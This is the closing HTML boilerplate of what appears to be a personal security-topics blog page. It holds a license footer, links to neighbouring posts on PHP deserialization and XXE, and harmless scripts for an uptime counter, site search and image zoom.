target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> è®¸å¯åè®®ã€‚</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="ååºåˆ—åŒ–-PHP"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ååºåˆ—åŒ–-PHP</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/" rel="next" title="XML+XXE"><span class="post-nav-text">XML+XXE</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 â€“ 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Nayst</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v6.2.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.6</span></div><div class="live-time"><span>æœ¬åšå®¢å·²èŒèŒå“’åœ°è¿è¡Œ</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2021-07-01T18:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} å¤© ${passHour} å°æ—¶ ${passMinute} åˆ† ${passSecond} ç§’`;
}
blog_live_time();
</script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="æœç´¢..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>